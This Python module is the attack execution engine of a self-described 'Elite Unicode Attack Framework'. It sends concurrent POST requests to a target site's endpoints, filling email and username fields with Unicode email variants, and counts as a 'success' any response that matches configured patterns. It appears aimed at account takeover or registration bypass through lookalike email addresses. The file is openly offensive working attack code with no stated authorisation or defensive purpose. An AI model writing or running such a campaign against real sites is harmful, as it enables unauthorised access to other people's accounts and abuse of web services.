#!/usr/bin/env python3
"""
Elite Unicode Attack Framework - Attack Execution Engine
Professional attack execution with clean output
"""

import asyncio
import aiohttp
import time
import re
from typing import List, Dict, Optional
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor
from core.logger import get_logger
from core.config import AttackConfig, SUCCESS_PATTERNS, FAILURE_PATTERNS
from modules.variant_engine import EmailVariant

logger = get_logger("AttackExecutor")


@dataclass
class AttackResult:
    """Attack result with all details"""
    timestamp: float
    target_url: str
    variant: str
    technique: str
    status_code: int
    response_time: float
    success: bool
    indicators: List[str]
    error: Optional[str] = None


class AttackExecutor:
    """Professional attack execution engine"""
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.logger = logger
        self.results: List[AttackResult] = []
        self.success_count = 0
        self.failure_count = 0
    
    async def execute_attack_campaign(self, variants: List[EmailVariant], 
                                     endpoints: List[str]) -> List[AttackResult]:
        """
        Execute complete attack campaign
        
        Args:
            variants: Email variants to test
            endpoints: Target endpoints
            
        Returns:
            List of attack results
        """
        self.logger.info(f"Starting attack campaign: {len(variants)} variants × {len(endpoints)} endpoints")
        
        # Create attack tasks
        tasks = []
        for variant in variants:
            for endpoint in endpoints:
                task = self._execute_single_attack(variant, endpoint)
                tasks.append(task)
        
        # Execute with concurrency limit
        semaphore = asyncio.Semaphore(self.config.threads)
        
        async def bounded_attack(task):
            async with semaphore:
                return await task
        
        # Execute all attacks
        self.logger.info(f"Executing {len(tasks)} attacks with {self.config.threads} threads")
        results = await asyncio.gather(*[bounded_attack(task) for task in tasks])
        
        # Filter None results
        self.results = [r for r in results if r is not None]
        
        # Count successes
        self.success_count = len([r for r in self.results if r.success])
        self.failure_count = len(self.results) - self.success_count
        
        self.logger.info(f"Attack campaign complete: {self.success_count} successes, {self.failure_count} failures")
        
        return self.results
    
    async def _execute_single_attack(self, variant: EmailVariant, 
                                     endpoint: str) -> Optional[AttackResult]:
        """Execute single attack attempt"""
        start_time = time.time()
        
        try:
            # Prepare request
            full_url = f"{self.config.target_url.rstrip('/')}/{endpoint.lstrip('/')}"
            
            async with aiohttp.ClientSession() as session:
                # Prepare data
                data = {
                    'email': variant.variant,
                    'username': variant.variant,
                    'user_email': variant.variant,
                }
                
                # Execute request
                async with session.post(
                    full_url,
                    data=data,
                    timeout=aiohttp.ClientTimeout(total=self.config.timeout),
                    allow_redirects=True
                ) as response:
                    response_time = time.time() - start_time
                    response_text = await response.text()
                    
                    # Analyze response
                    success, indicators = self._analyze_response(response_text, response.status)
                    
                    if success:
                        self.logger.info(f"✓ Success: {variant.variant} at {endpoint}")
                    
                    return AttackResult(
                        timestamp=time.time(),
                        target_url=full_url,
                        variant=variant.variant,
                        technique=variant.technique,
                        status_code=response.status,
                        response_time=response_time,
                        success=success,
                        indicators=indicators
                    )
        
        except asyncio.TimeoutError:
            self.logger.debug(f"Timeout: {variant.variant}")
            return AttackResult(
                timestamp=time.time(),
                target_url=endpoint,
                variant=variant.variant,
                technique=variant.technique,
                status_code=0,
                response_time=time.time() - start_time,
                success=False,
                indicators=[],
                error="Timeout"
            )
        
        except Exception as e:
            self.logger.debug(f"Error attacking {variant.variant}: {str(e)}")
            return None
        
        # Apply rate limiting
        await asyncio.sleep(self.config.delay)
    
    def _analyze_response(self, response_text: str, status_code: int) -> tuple:
        """
        Analyze response for success indicators
        
        Returns:
            (success: bool, indicators: List[str])
        """
        response_lower = response_text.lower()
        indicators = []
        
        # Check success patterns
        for pattern in SUCCESS_PATTERNS:
            if re.search(pattern, response_lower):
                indicators.append(f"success:{pattern}")
        
        # Check failure patterns
        for pattern in FAILURE_PATTERNS:
            if re.search(pattern, response_lower):
                indicators.append(f"failure:{pattern}")
        
        # Determine success
        success = len([i for i in indicators if i.startswith('success:')]) > 0
        
        return success, indicators
    
    def get_statistics(self) -> Dict:
        """Get attack statistics"""
        if not self.results:
            return {}
        
        total_time = sum(r.response_time for r in self.results)
        
        stats = {
            'total_attacks': len(self.results),
            'successful': self.success_count,
            'failed': self.failure_count,
            'success_rate': (self.success_count / len(self.results)) * 100 if self.results else 0,
            'avg_response_time': total_time / len(self.results),
            'total_duration': total_time,
            'techniques_tested': len(set(r.technique for r in self.results)),
            'unique_variants': len(set(r.variant for r in self.results)),
        }
        
        # Success by technique
        stats['by_technique'] = {}
        for result in self.results:
            if result.technique not in stats['by_technique']:
                stats['by_technique'][result.technique] = {'total': 0, 'success': 0}
            stats['by_technique'][result.technique]['total'] += 1
            if result.success:
                stats['by_technique'][result.technique]['success'] += 1
        
        return stats
    
    def export_results(self) -> List[Dict]:
        """Export results as dictionary list"""
        return [asdict(r) for r in self.results]
